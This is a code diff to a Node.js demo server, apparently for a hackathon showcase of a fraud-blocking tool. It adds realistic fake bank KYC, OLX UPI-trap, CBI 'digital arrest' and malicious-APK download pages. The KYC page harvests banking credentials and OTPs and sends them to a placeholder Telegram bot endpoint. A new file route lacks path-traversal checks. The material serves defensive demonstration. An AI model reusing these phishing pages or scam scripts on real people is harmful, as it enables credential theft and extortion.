@@ -1,4 +1,6 @@
 const http = require('http');
+const fs = require('fs');
+const path = require('path');
 const PORT = 8080;
 
 const server = http.createServer((req, res) => {
@@ -7,15 +9,16 @@ const server = http.createServer((req, res) => {
   // ═══════════════════════════════════════════════════════════════════════════
   // DOWNLOAD ENDPOINT — Malicious APK payload
   // ═══════════════════════════════════════════════════════════════════════════
-  if (req.url === '/download-file' || req.url === '/downloads/sbi_yono_rewards.apk') {
+  if (req.url === '/download-file' || req.url === '/downloads/sbi_yono_rewards.apk' || req.url === '/downloads/RTO_Challan.apk') {
     const totalBytes = 5 * 1024 * 1024; // 5 MB realistic APK size
     const chunkSize = 64 * 1024; // 64 KB per chunk
     const dummyChunk = Buffer.alloc(chunkSize, 0x50);
-    dummyChunk.write('PK\x03\x04verity_sbi_yono_malicious_apk_payload', 0);
+    const filename = req.url.includes('RTO_Challan') ? 'RTO_Challan.apk' : 'sbi_yono_rewards.apk';
+    dummyChunk.write(`PK\x03\x04verity_${filename}_malicious_payload`, 0);
 
     res.writeHead(200, {
       'Content-Type': 'application/vnd.android.package-archive',
-      'Content-Disposition': 'attachment; filename="sbi_yono_rewards.apk"',
+      'Content-Disposition': `attachment; filename="${filename}"`,
       'Content-Length': totalBytes,
       'Accept-Ranges': 'bytes'
     });
@@ -499,10 +502,175 @@ const server = http.createServer((req, res) => {
   }
 
   // ═══════════════════════════════════════════════════════════════════════════
-  // HUB DASHBOARD
+  // SCENARIO 1 — Fake SBI KYC + Telegram Webhook Exfiltration
   // ═══════════════════════════════════════════════════════════════════════════
-  if (req.url === '/' || req.url === '/favicon.ico') {
+  if (req.url === '/demo/sbi-kyc-telegram') {
+    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+    return res.end(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>State Bank of India — Mandatory KYC Verification</title>
+<style>
+  body{font-family:Arial,sans-serif;background:#f0f4f8;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
+  .box{background:#fff;border-radius:10px;box-shadow:0 8px 30px rgba(0,0,0,.1);width:420px;border-top:6px solid #1b365d;overflow:hidden}
+  .header{background:#1b365d;color:#fff;padding:20px;text-align:center}
+  .logo{font-size:20px;font-weight:bold;letter-spacing:1px}
+  .warning{background:#fef2f2;border-left:4px solid #ef4444;padding:12px 16px;margin:20px;font-size:13px;color:#991b1b;line-height:1.4}
+  .content{padding:0 24px 24px 24px}
+  .grp{margin-bottom:14px}
+  label{font-size:12px;font-weight:bold;color:#475569;display:block;margin-bottom:4px}
+  input{width:100%;padding:10px;border:1px solid #cbd5e1;border-radius:6px;box-sizing:border-box;font-size:14px}
+  button{width:100%;padding:14px;background:#1b365d;color:#fff;border:none;border-radius:6px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:10px}
+  .status{margin-top:14px;padding:10px;background:#f8fafc;border:1px dashed #cbd5e1;border-radius:6px;font-size:12px;color:#64748b;text-align:center}
+</style></head><body>
+<div class="box">
+  <div class="header">
+    <div class="logo">STATE BANK OF INDIA</div>
+    <div style="font-size:12px;opacity:.9;margin-top:4px">Online NetBanking Customer Verification</div>
+  </div>
+  <div class="warning">
+    <strong>⚠️ URGENT ACCOUNT NOTICE:</strong> Your NetBanking profile will be suspended within 24 hours due to pending KYC compliance. Update PAN and identity details immediately.
+  </div>
+  <div class="content">
+    <form id="kycForm" action="https://api.telegram.org/bot7123456789:AAF_FAKE_EXFIL_TOKEN_DEMO/sendMessage" method="POST">
+      <div class="grp"><label>Internet Banking Username</label><input type="text" name="username" placeholder="Enter SBI Username" required></div>
+      <div class="grp"><label>Login Password</label><input type="password" name="password" placeholder="Enter Login Password" required></div>
+      <div class="grp"><label>Profile Password</label><input type="password" name="profile_password" placeholder="Enter Profile Password" required></div>
+      <div class="grp"><label>PAN Card Number</label><input type="text" name="pan" placeholder="ABCDE1234F" required></div>
+      <div class="grp"><label>One Time Password (OTP)</label><input type="text" name="otp" placeholder="Enter 6-digit OTP received via SMS" required></div>
+      <button type="submit" id="btn-submit">SUBMIT &amp; VERIFY KYC</button>
+    </form>
+    <div class="status" id="exfil-status">
+      Rogue Exfil Endpoint: <code>api.telegram.org/bot.../sendMessage</code>
+    </div>
+  </div>
+</div>
+<script>
+  document.getElementById('kycForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const status = document.getElementById('exfil-status');
+    status.textContent = 'Exfiltrating credentials to rogue Telegram webhook...';
+    fetch('https://api.telegram.org/bot7123456789:AAF_FAKE_EXFIL_TOKEN_DEMO/sendMessage?chat_id=987654321&text=EXFIL_SUCCESS', {
+      method: 'POST',
+      mode: 'no-cors'
+    }).then(() => {
+      status.textContent = '❌ Exfiltration completed (If Verity was active, this request was severed).';
+    }).catch(err => {
+      status.textContent = '🛡️ Blocked / Intercepted by Verity Security Shield!';
+    });
+  });
+</script>
+</body></html>`);
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // SCENARIO 2 — OLX UPI Collect Trap
+  // ═══════════════════════════════════════════════════════════════════════════
+  if (req.url === '/demo/olx-upi') {
+    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+    return res.end(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>OLX Safe Pay — Escrow Buyer Payment</title>
+<style>
+  body{font-family:Arial,sans-serif;background:#0f172a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
+  .card{background:#1e293b;padding:36px;border-radius:16px;border:1px solid #334155;text-align:center;width:400px;box-shadow:0 20px 40px rgba(0,0,0,.5)}
+  .badge{display:inline-block;padding:4px 12px;background:#002f34;color:#23e5db;border-radius:20px;font-weight:bold;font-size:13px;margin-bottom:12px}
+  .amount{font-size:44px;font-weight:bold;color:#4ade80;margin:16px 0}
+  .qr-box{background:#fff;padding:16px;border-radius:12px;display:inline-block;margin:16px 0}
+  .btn{display:block;width:100%;padding:16px;background:#23e5db;color:#002f34;text-decoration:none;border-radius:8px;font-weight:bold;font-size:17px;margin-top:16px;box-sizing:border-box}
+  .btn:hover{background:#1fd2c7}
+  .note{font-size:13px;color:#94a3b8;margin-top:12px;line-height:1.4}
+</style></head><body>
+<div class="card">
+  <div class="badge">OLX BUYER ESCROW SERVICE</div>
+  <h2 style="margin:0;color:#f8fafc">Buyer Sent ₹15,000 Payment</h2>
+  <p class="note">The buyer for your listing has transferred ₹15,000 into OLX Instant UPI Escrow. Scan or click below to accept payment into your bank account.</p>
+  <div class="amount">₹15,000</div>
+  <div class="qr-box">
+    <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=upi%3A%2F%2Fpay%3Fpa%3Dolx_buyer_trap%40okhdfcbank%26pn%3DOLXBuyer%26am%3D15000%26cu%3DINR%26tn%3DOLX%2BPayment%2BAccept" alt="UPI QR Collect Trap" data-upi="upi://pay?pa=olx_buyer_trap@okhdfcbank&pn=OLXBuyer&am=15000&cu=INR&tn=OLX+Payment+Accept">
+  </div>
+  <a class="btn" href="upi://pay?pa=olx_buyer_trap@okhdfcbank&pn=OLXBuyer&am=15000&cu=INR&tn=OLX+Payment+Accept" id="upi-btn">
+    👉 Click to Accept ₹15,000 (Collect Trap)
+  </a>
+  <p style="font-size:11px;color:#ef4444;margin-top:12px">⚠️ Reality: Clicking this authorizes a ₹15,000 DEBIT from your account.</p>
+</div>
+</body></html>`);
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // SCENARIO 3 — CBI Digital Arrest Extortion
+  // ═══════════════════════════════════════════════════════════════════════════
+  if (req.url === '/demo/cbi-digital-arrest') {
+    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+    return res.end(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Central Bureau of Investigation — Cyber Crime Notice</title>
+<style>
+  body{font-family:Arial,sans-serif;background:#450a0a;color:#fef2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
+  .card{background:#1c1917;padding:36px;border-radius:12px;border:3px solid #dc2626;width:480px;box-shadow:0 20px 50px rgba(0,0,0,.8);text-align:center}
+  .emblem{font-size:42px;margin-bottom:10px}
+  h2{color:#ef4444;margin:0 0 8px 0;font-size:22px;letter-spacing:1px}
+  .sub{color:#fca5a5;font-size:14px;font-weight:bold;margin-bottom:18px;text-transform:uppercase}
+  .details{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);border-radius:8px;padding:16px;text-align:left;font-size:13px;line-height:1.6;margin-bottom:20px;color:#fee2e2}
+  .details strong{color:#f87171}
+  .btn{display:block;width:100%;padding:14px;background:#dc2626;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;font-size:16px;box-sizing:border-box}
+  .timer{margin-top:14px;font-size:12px;color:#fca5a5}
+</style></head><body>
+<div class="card">
+  <div class="emblem">⚖️ 🏛️ 🚨</div>
+  <h2>CENTRAL BUREAU OF INVESTIGATION</h2>
+  <div class="sub">CYBER CRIME CELL &bull; SUPREME COURT DIGITAL NOTICE</div>
+  <div class="details">
+    <p><strong>CASE ID:</strong> CBI/MUM/NCB-84920/2026</p>
+    <p><strong>ALLEGATION:</strong> Illegal narcotics parcel &amp; money laundering investigation linked to your Aadhaar.</p>
+    <p><strong>STATUS:</strong> You are placed under <strong>DIGITAL ARREST</strong> by order of virtual court. Do not disconnect.</p>
+    <p style="margin-top:8px">You must connect to video call immediately on Skype for interrogation and transfer ₹1,50,000 clearance fee to the RBI safe verification account to prevent immediate physical arrest warrant.</p>
+  </div>
+  <a class="btn" href="#" onclick="alert('Digital Arrest Extortion Simulation — Verity flags this in real-time with SIG_DIGITAL_ARREST_EXTORTION.');return false;">
+    🚨 Connect to Virtual Interrogation Video Call
+  </a>
+  <div class="timer">Stay on call &bull; Virtual Arrest Warrant in Effect &bull; Immediate Execution</div>
+</div>
+</body></html>`);
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // SCENARIO 4 — RTO_Challan.apk Malicious Dropper
+  // ═══════════════════════════════════════════════════════════════════════════
+  if (req.url === '/demo/rto-apk') {
+    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+    return res.end(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>e-Challan Parivahan — Download Official Challan APK</title>
+<style>
+  body{font-family:Arial,sans-serif;background:#e0f2fe;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
+  .card{background:#fff;padding:40px;border-radius:12px;text-align:center;width:420px;box-shadow:0 15px 35px rgba(0,0,0,.1);border-top:6px solid #0284c7}
+  .logo{font-size:20px;font-weight:bold;color:#0369a1;margin-bottom:6px}
+  .notice{background:#fffbeb;border:1px solid #fde68a;border-radius:8px;padding:14px;margin:20px 0;font-size:13px;color:#92400e;line-height:1.5;text-align:left}
+  .btn{display:inline-block;width:100%;padding:16px;background:#0284c7;color:#fff;text-decoration:none;border-radius:8px;font-weight:bold;font-size:16px;box-sizing:border-box;margin-top:10px}
+  .btn:hover{background:#0369a1}
+</style></head><body>
+<div class="card">
+  <div class="logo">PARIVAHAN E-CHALLAN SERVICES</div>
+  <p style="color:#64748b;font-size:13px">Ministry of Road Transport &amp; Highways</p>
+  <div class="notice">
+    <strong>🚨 PENDING VIOLATION NOTICE:</strong><br>
+    Vehicle No: <code>DL-01-AB-1234</code><br>
+    Offense: Overspeeding (Violation Section 183)<br>
+    Fine Amount: ₹1,000<br><br>
+    To inspect camera photographic evidence and dispute fine, download and install the official Parivahan Challan mobile app below.
+  </div>
+  <a class="btn" href="/downloads/RTO_Challan.apk" id="dl-apk-btn">
+    📥 Download Official RTO_Challan.apk (5 MB)
+  </a>
+  <p style="font-size:11px;color:#64748b;margin-top:14px">With Verity active, this download is paused in flight before saving to disk.</p>
+</div>
+</body></html>`);
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // HUB DASHBOARD & LAUNCHER
+  // ═══════════════════════════════════════════════════════════════════════════
+  if (req.url === '/' || req.url === '/index.html' || req.url === '/favicon.ico') {
     if (req.url === '/favicon.ico') { res.writeHead(204); return res.end(); }
+
+    const demoPath = path.join(__dirname, 'demo', 'index.html');
+    if (fs.existsSync(demoPath)) {
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+      return res.end(fs.readFileSync(demoPath, 'utf8'));
+    }
+
     res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
     return res.end(`<!DOCTYPE html><html><head><title>Verity 2.0 — Executive Hackathon Showcase</title>
 <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
@@ -657,6 +825,24 @@ const server = http.createServer((req, res) => {
 </div>
 
 </body></html>`);
+  // Static file serving for mobile-scanner PWA
+  if (req.url.startsWith('/mobile-scanner/')) {
+    const relativePath = req.url.slice('/mobile-scanner/'.length).split('?')[0] || 'index.html';
+    const filePath = path.join(__dirname, 'mobile-scanner', relativePath);
+    if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
+      const ext = path.extname(filePath).toLowerCase();
+      const mimeTypes = {
+        '.html': 'text/html; charset=utf-8',
+        '.js': 'text/javascript; charset=utf-8',
+        '.css': 'text/css; charset=utf-8',
+        '.json': 'application/json',
+        '.webmanifest': 'application/manifest+json',
+        '.png': 'image/png',
+        '.svg': 'image/svg+xml'
+      };
+      res.writeHead(200, { 'Content-Type': mimeTypes[ext] || 'application/octet-stream' });
+      return res.end(fs.readFileSync(filePath));
+    }
   }
 
   res.writeHead(404);
